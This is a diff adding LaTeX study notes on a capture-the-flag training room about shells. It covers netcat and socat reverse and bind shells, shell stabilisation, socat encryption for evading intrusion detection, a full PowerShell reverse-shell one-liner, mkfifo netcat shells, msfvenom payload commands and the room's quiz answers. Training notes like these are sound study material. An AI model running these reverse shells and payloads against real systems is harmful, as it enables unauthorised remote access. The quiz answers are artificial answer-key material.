@@ -1,0 +1,322 @@
+\subsubsection*{What the Shell?}
+\addcontentsline{toc}{subsubsection}{What the Shell?}
+\T{What is a shell?}{
+A shell is the tool we use to interact with a Command Line Interface (CLI), e.g the usual bash or sh programs in Linux or \cd{cmd.exe} and PowerShell on Windows.\\
+When targeting remote systems, we can force an an application on the server to execute the code we desire, this way allowing us to create a shell on the target.\\
+There are mostly two types of shells: 
+\begin{itemize}
+\item \textbf{Reverse} shell: a command line access to the server sent by the remote server itself to the attacking system.
+\item \textbf{Bind} shell: an open port on the server the attacking system can connect to to run the commands.
+\end{itemize}
+}
+\T{Tools}{
+In order to send and receive bind and reverse shells respectively, we will resort to multiple tools, among which the most important are:
+\begin{itemize}
+\item \textbf{Netcat:} the standard tool for network interactions, especially to receive reverse shells with the probably already standard syntax \cd{nc -nlvp <PORT-NR>}. It can also be used to connect to bind shells on the target system and more (e.g enumeration banner-grabbing, though out-of-scope for now).\\
+It has the downside of a high instability, mitigatable with certain techniques.
+\item \textbf{Socat:} serves the same purpose as Netcat, but with a broader utility spectrum and more stable connections.\\
+Despite these upsides, it is more difficult to use and is not installed per default on Linux, as opposed to netcat.
+\item \textbf{Metasploit multi/handler:} as seen in the \nameref{subsubsec:Metasploit_Meterpreter} module, this is used to receive reverse shells, which happen to be very stable and can be improvable with the Metasploit internal tools. This is the way to interact with a Meterpreter shell and the easiest way to handle staged payloads.
+\item \textbf{Msfvenom:} as seen in the Metasploit module in multiple ocasions, Msfvenom is a standalone payload generator, which in this shell context can of course be helpful when crafting shell-generatin payloads. 
+\item \textbf{Further references:} as a small list of ``independent'' shell repositories, we have primarily the following:
+	\begin{itemize}
+	\item \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Reverse\%20Shell\%20Cheatsheet.md}{Payloads all the Things}
+	\item \href{https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet}{Pentest Monkey's Reverse Shell Cheatsheet}
+	\item Kali's \cd{/usr/share/webshells} repository
+	\item \href{https://github.com/danielmiessler/SecLists}{SecLists repo}'s shell-obtaining code part.
+	\end{itemize}
+\end{itemize}
+}
+\T{Types of Shell}{
+As stated above, we have the following two main shell types:
+\begin{itemize}
+\item \textbf{Reverse shells}: The target machine is forced to connect back to the attacking machine, where a listener is set up to receive said connection. Their use relies mostly on the firewall avoidance related to the absence of incoming connections, since it is the target which connects to an outsider. Their disadvantage lies on the connection type, since the attacker needs to configure their network to accept this external shell (when outside of the internal THM network).\\
+These shells are easier to execute and debug and are the shell of choice most of the time in CTF environments.\\
+
+They work as follows: 
+	\begin{itemize}
+	\item On the attacking machine we set up a so-called reverse listener to catch the shell via\\
+	\cd{sudo nc -lvnp <PORT-NR>}\\
+	(usually with port 443 as the default for examples)
+	\item On the target machine we send a reverse shell, be it through a CLI (not too likely) or rather a remote website or similar with the syntax:\\
+	\cd{nc <Attacker-IP> <Att-Port> -e /bin/bash}
+	\end{itemize}
+\item \textbf{Bind shells:} the target machine opens up a listener the attacking machine can connect to to obtain RCE.\\
+As the counterpart to reverse shells, the target's firewall might prevent this connection, but the attacking part does not need to set anything up on their own network.\\
+They work by the following pattern:
+	\begin{itemize}
+	\item On the target machine we set up a listener with the above syntax, eventually adding the execution of some applications, e.g here \cd{cmd.exe} on a Windows machine.\\
+	\cd{nc -lnvp <PORT> -e "cmd.exe"}
+	\item On the attacking machine we launch the connection via \\
+	\cd{nc <TARGET-IP> <T-PORT>}
+	and get RCE on the target remote machine.
+	\end{itemize}
+\end{itemize}
+There is a further binary distinction of shells:
+\begin{itemize}
+\item \textbf{Interactive shells:} similar to any other CLI environment, these are shells that allow the user to interact with running programs, e.g via stdin to answer the classical \cd{y/n} questions in an ssh connection.
+\item \textbf{Non-Interactive shells:} in these shells we can only run programs that do not require a further interaction with it after execution, as we will not be able to do so. \\
+Note that the output of such interactive commands will be run somewhere, and locating this exact spot is a very valuable finding.
+\end{itemize}
+
+\textbf{Note:} Throughout the rest of this module, the alias \cd{listener} is unique to the attacking machine the examples stem from and aliases the command \cd{sudo rlwrap nc -lnvp 443}. It will not work anywhere else unless configured locally.\\
+
+\QA{
+Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?
+}{
+R
+}
+\QA{
+You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)
+}{
+N (as we will usually not have a prompt on a static website we can interact with)
+}
+\QA{
+When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
+}{
+T
+}
+}
+\T{Netcat}{
+Netcat is one of the most universal tools in a networking context, as it allows both the listening and connecting features we need to establish both kinds of shells we've seen so far.\\
+
+To establish a reverse shell, we need to set up a listener, which we'll do with the Netcat command \cd{nc -lnvp <PORT>}, with the switches each meaning:
+\begin{itemize}
+\item \cd{-l} to establish a listener
+\item \cd{-v} to request verbose output
+\item \cd{-n} to not resolve host names or use DNS (to be ignored for now)
+\item \cd{-p} to specify the port number afterwards
+\end{itemize}
+When setting up a listener in a port with number below 1024, the command needs \cd{sudo} privileges. Note that it might still be a good idea to set up the listener on a well-known port, e.g 80, 443, 53 since they are more likely to get past firewall regulations on the target. \\
+Once the listener is set up, we can connect to it with any number of payloads.
+
+To establish a bind shell, we need to set up a listener on the target first, to which we later connect using Netcat as follows: \\
+\cd{nc <TARGET-IP> <TARGET-PORT>}
+
+\QA{
+Which option tells netcat to listen?
+}{
+-l
+}
+\QA{
+How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?
+}{
+\cd{nc 10.10.10.11 8080}
+}
+}
+\T{Netcat Shell Stabilisation}{
+As stated in the beginning, Netcat comes with the downside of instability in its shells: \cd{Ctrl+C} kills the shell, they are non-interactive and tend to strange formatting errors, as netcat shells are not actual terminals, but processes inside a different terminal.\\
+In order to stabilize these shells, we will use one (or mutiiple) of the following techniques:
+\begin{enumerate}
+\item Python (only in Linux systems):
+	\begin{enumerate}
+	\item Run \cd{python -c 'import pty;pty.spawn("/bin/bash")'}, to use Python to spawn a bash shell. If needed, replace \cd{python} for \cd{pythonX}, where X is the required version (2 or 3). This shell will still lack autocomplete or arrow keys.
+	\item Run \cd{export TERM=xterm} to get access to term commands, e.g \cd{clear}.
+	\item Background the shell with \cd{Ctrl +Z} and run \cd{stty raw -echo; fg} to disable the listening terminal echo and then foreground the shell.\\
+	To recover echo on the attacking terminal after the shell dies, run \cd{reset}
+	\end{enumerate}
+\item \cd{rlwrap} (Best suited for Windows systems):\\
+rlwrap is a program that gives us access to history, tab autocompletion and arrow keys upon receiving a shell. Note that is does not come installed per default.\\
+To use rlwrap, we need to change the syntax of the shell to:\\
+\cd{rlwrap nc -lnvp <PORT>}\\
+This listener is a more fully featured shell and especially useful for Windows shells, usually more difficult to stabilize. When in Linux, perform the last step of the above technique (\cd{stty raw -echo; fg}) to fully stabilize the shell.
+\item Socat (only for Linux targets):\\
+We can also use the initial, easier Netcat shell to establish a better Socat shell. To do so, we can transfer a \href{https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true}{socat static compiled binary} to the target machine using the attacking machine as a webserver (\cd{sudo python3 -m http.server 80}) and then downloading the binary with \cd{wget <LOCAL-IP>/socat -O /tmp/socat}.\\
+In Windows this would look as follows:\\
+\cd{Invoke-WebRequest -uri <LOCAL-IP>/socat.exe \\
+-outfile C:$\bsl\bsl$Windows$\bsl$temp$\bsl$socat.exe}\\
+Note, though, that Socat shells on Windows are not more stable than Netcat shells.
+\end{enumerate}
+When using reverse or bind shells we need to manually adjust the terminal tty size, as it won't autoadjust as with regular shells. To do so, open another terminal, run \cd{stty -a} and note the values for rows and columns. Then, set these values with \cd{stty rows <value>} and \cd{stty cols <values>}.
+
+\QA{
+How would you change your terminal size to have 238 columns?
+}{
+\cd{stty cols 238}
+}
+\QA{
+What is the syntax for setting up a Python3 webserver on port 80?
+}{
+\cd{sudo python3 -m http.server 80}
+}
+}
+\T{Socat}{
+Though similar to Netcat, it is best to think aboout Socat as a connector between two points, be it files, listening ports or peripherics, as in this task with a port and the keyboard.\\
+As mentioned before, we have a more complicated syntax on Socat than on Netcat, divided as follows for both shell types:
+\begin{itemize}
+\item Reverse shells:\\
+When establishing a reverse shell with socat, we have to set up a listener on the attacking machine using \cdnl{socat TCP-L:<PORT> -}
+This is equivalent to \cd{nc -lvnp <PORT>} on Netcat.\\
+To connect back to this listener, we run the following command on the target machine: 
+	\begin{itemize}
+	\item On Windows:\\
+	\cd{socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes}\\
+	which runs powershell with Unix style standard input and output via the \cd{pipes} option.
+	\item On Linux:\\
+	\cd{socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"}\\
+	which executes an interactive bash shell on the listening device.
+	\end{itemize}
+\item Bind shells:\\
+Similar (but not equal) to the listener for the reverse shell on the attacking system, we set up a listener on the target system with the following syntax:
+	\begin{itemize}
+	\item On a Linux target:
+		\cdnl{socat TCP-L:<PORT> EXEC:"bash -li"}
+	\item On a Windows target:
+		\cdnl{socat TCP-L:<PORT> EXEC:powershell.exe,pipes}
+		As before, the \cd{pipes} option allows for an easier interaction between Windows and Unix systems.
+	\end{itemize}
+	On our attacking machine we connect either way to the listener set up on the target machine with the command
+	\cdnl{socat TCP:<TARGET-IP>:<TARGET-PORT> -}
+\end{itemize}
+
+As stated before, one of the the best features of Socat is the establishment of fully stable Linux tty reverse shells. As stated above, this only works for Linux targets, but is significantly better than ``normal'' netcat shells. \\
+The syntax for the listener for this tty shell is as follows:
+\cdnl{socat TCP-L:<port> FILE:\`{}tty\`{},raw,echo=0}
+Note the \textbf{backticks, not quotes} around tty!
+This new command tells socat to connect the specified port and a file, namely the current TTY(teletype) as a file with specified echo to be zero. This amounts to backgrounding a Netcat session and then running \cd{stty raw -echo;fg}, but is directly stable and hooked into a full tty.\\
+To make use of this listener, the target machine needs to have Socat installed, or we need to execute the aforementioned Socat binary to then run \cdnl{socat TCP:<ATT-IP>:<ATT-PORT> EXEC:"bash -li",pty,stderr,sigint,setsid,sane}
+This command instructs the connnection to be as follows: 
+\begin{itemize}
+\item \cd{TCP:<ATT-IP>:<ATT-PORT>}\\
+Connect to the attacking machine at the desired port
+\item \cd{EXEC:"bash -li"}\\
+Create an interactive bash session
+\item \cd{pty}\\
+Allocate a pseudoterminal on the target for stabilisation
+\item \cd{stderr}\\
+Display error messages in the shell
+\item \cd{sigint}\\
+Pass \cd{Ctrl+Z} commands into the shell, allowing to kill commands
+\item \cd{setsid}\\
+Create the process in a new session
+\item \cd{sane}\\
+Stabilize the terminal
+\end{itemize}
+Note that this Socat command is also possible to be run from within a non-interactive shell, e.g one established with Netcat, hence giving the process: 
+\begin{enumerate}
+\item Set up a non interactive Netcat listener on the target
+\item Connect to the bind shell
+\item Set up a Socat listener on the attacking machine
+\item Run the Socat stable reverse shell to establish a more fully featured shell.
+\end{enumerate}
+If the Socat shell is not working at some point, we can add \cd{-d -d} to the commands to increase the verbosity. Note that this is mostly used for experimental purposes, but not for general use.
+\QA{
+How would we get socat to listen on TCP port 8080?
+}{
+\cd{(socat) TCP-L:8080}.\\
+In this anwer the socat command is not needed, probably taken for granted.
+}
+}
+\T{Socat Encrypted Shells}{
+Among the multiple features of Socat is the creation of encrypted shells, both bind and reverse, which are unfeasible to be spied on and can hence bypass IDSs (Intrusion Detection System).\\
+The way to adapt the unencrypted TCP connection of the previous task to an encrypted one is by using \cd{OPENSSL} instead of \cd{TCP} in the above commands and providing an encryption certificate.\\
+This certificate we create easiest on the attacking machine with the command 
+\cdnl{openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt}
+This instructs the attacking machine to create a 2048 bit RSA key and cert file, self-signed and with a validity of 362 days. The rest of the information requested at the creation can be left blank or filled out randomly. \\
+Then, both key and certificate have to be combined onto a single \cd{.pem} file with \cd{cat shell.key shell.crt > shell.pem}
+to then set up the reverse listener with 
+\cdnl{socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -}
+This command sets up the openssl listener with the previously created certificate. The \cd{verify=0} ensures that the connection does not validate that our certificate has been properly signed by a CA. The certificate \textbf{must} be used on the listening device. To connect back to our reverse listener we run on the target: 
+\cdnl{socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash}
+
+On a bind shell the whole thing works similarly:\\
+On the target we set up the listener with the created certificate (also for a Windows machine as in this example): 
+\cdnl{socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes}
+Note: change \cd{cmd.exe,pipes} for {/bin/bash} when on a Linux machine
+and we connect to it with our attacking machine:\\
+\cd{socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0}\\
+
+Note that this works as well with the previous Linux-directed TTY shell from the previous task (see the syntax below). 
+
+\QA{
+What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
+}{
+\cd{socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:\`{}tty\`{},raw,echo=0}\\
+Note that the certificate comes before the tty file specification.
+}
+\QA{
+If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+}{
+\cd{socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane}\\
+Recall this last part from last task to connect to stable shells.
+}
+}
+\T{Common Shell Payloads}{
+When using a Netcat listener, one can most times use the \cd{-e} switch to execute a process on connection, e.g a listener \cd{nc -nlvp <PORT> -e /bin/bash} to run a bind shell on the target.\\
+For a reverse shell, connecting back with \cd{nc <LOCAL-IP> <PORT> -e /bin/bash} will give a reverse shell on the target.\\
+Note that for most Netcat versions this is not included, as it is considered to be insecure. Nonetheless, the binary compiled for Windows will allow for it.\\
+For a Linux system we run the following command to create a listener for a \textbf{bind} shell:
+\cdnl{mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>\&1; rm /tmp/f}
+This command does the following:
+\begin{enumerate}
+\item Create a named pipe at \cd{/tmp/f}
+\item Start a Netcat listener at port <PORT>
+\item Connect the input of the Netcat listener to the output of the named pipe.
+\item Pass the output of the netcat listener via the pipe operator \cd{|} to \cd{sh}
+\item Send the \cd{stderr} output (2) into \cd{stdout} (1) via \cd{2>\&1} (2>1 would assume a file named 1 instead of directing to stdout)
+\item Send the \cd{stdout} into the named pipe
+\item Delete the named pipe to close the circle (?)
+\end{enumerate}
+Similarly, for a reverse shell we use the command 
+\cdnl{mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>\&1; rm /tmp/f}
+using the netcat connect syntax.\\
+
+For a Windows Server we need a Powershell reverse shell which we can get via:
+\cdnl{powershell -c "\$client = New-Object System.Net.Sockets.TCPClient('{\normalfont \textbf{<IP>}}',{\normalfont \textbf{<PORT>}});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|\%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0)\{;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>\&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\\ \$sendbyte,0,\$sendbyte.Length);\$stream.Flush()\};\$client.Close()"}
+Note that here the IP and Port need to be set to the attacking IP and port. This can be copied to a cmd.exe shell and run to get a Powershell reverse shell.\\
+
+For other shell payloads, we are directed to \href{https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology\%20and\%20Resources/Reverse\%20Shell\%20Cheatsheet.md}{PayloadAllTheThings}, where lots of one-liners are available for a myriad of different languages.
+
+\QA{
+What command can be used to create a named pipe in Linux?
+}{
+\cd{mkfifo}
+}
+It is also recommended to search through the index of PayloadsAllTheThings
+}
+\T{msfvenom}{
+As seen in the \nameref{MsfvenomTask} Task above, msfvenom is used to generate multitude payloads for any system we wish to access using Metasploit, as well as in multiple different formats, e.g \cd{.exe, .py} and many more.\\
+Recall the basic syntax for msfvenom:
+\cdnl{msfvenom -p <PAYLOAD> <OPTIONS>}
+(e.g \cd{msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>}
+
+Some of the most relevant options are:
+\begin{itemize}
+\item \textbf{-f}: format; specifies the output format of the payload.
+\item \textbf{-o}: output; specifies output location and name of the payload.
+\item \textbf{LHOST}: IP to connect back to.
+\item \textbf{LPORT}: Port on the LHOST IP to connect back to. \\
+Note that ports below 1024 require root privileges.
+\end{itemize}
+There is a further difference in payloads generated with msfvenom: 
+\begin{itemize}
+\item \textbf{Staged} payloads: Are sent in two parts, first the stager, executed on the server itself to connect back to a listener to load the rest of the payload without it ever running on the disk, hence attempting to bypass antiviruses. \\
+These payloads require the Metasploit multi/handler as a special listener.
+\item \textbf{Stageless} payloads: Run in a single piece, are self-contained and attempt the connection directly when run.
+\end{itemize}
+Stageless paylaods are bigger, easier both to use and detect.\\
+Staged payloads are harder to use and to detect, at least the initial stager. Modern antiviruses also use the Anti-Malware Scan Interface (AMSI) to detect the rest of the payload when loading into the memory, making staged payloads to lose some of its effectiveness.\\
+
+We further have Meterpreter (more on it in the \nameref{subsubsec:Metasploit_Meterpreter} room) as a shell to take advantage of the payloads and exploits we run against the target. These shells are fully stable and can be switched "back and forth" between normal shells and Meterpreter shells, with multiple useful features such as hashdumps, file uploads and downloads and more. These shells must be caught in Meterpreter.\\
+
+The names for the payloads are usually given following the pattern \cd{<OS>/<arch>/<payload>}, e.g \cd{linux/x86/shell\_reverse\_tcp}, unless we are referring to Windows 32bit targets (x32), where the architecture is skipped (hence \cd{Windows/<payload>}.\\
+Stageless payloads are denoted with an underscore in the name (\cd{shell\_reverse\_tcp} as opposed to the slash-denoted staged payloads, e.g \cd{shell/reverse\_tcp}.\\
+This also applies to Meterpreter payloads.
+
+One can list all payloads with \cd{msfvenom --list payloads}, which can then be further piped to grep in the command line.
+
+For the first question we are instructed to generate a staged reverse shell for a 64 bit Windows target, in a .exe format using our TryHackMe tun0 IP address and a chosen port.\\
+\QA{
+Which symbol is used to show that a shell is stageless?
+}{
+\_
+}
+\QA{
+What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
+}{
+\cdnl{msfvenom -p linux/x64/meterpreter/reverse\_tcp -f elf LHOST=10.10.10.5 LPORT=443 -o shell}
+}
+}
+%\T{Metasploit multi/handler}{
+%
+%}
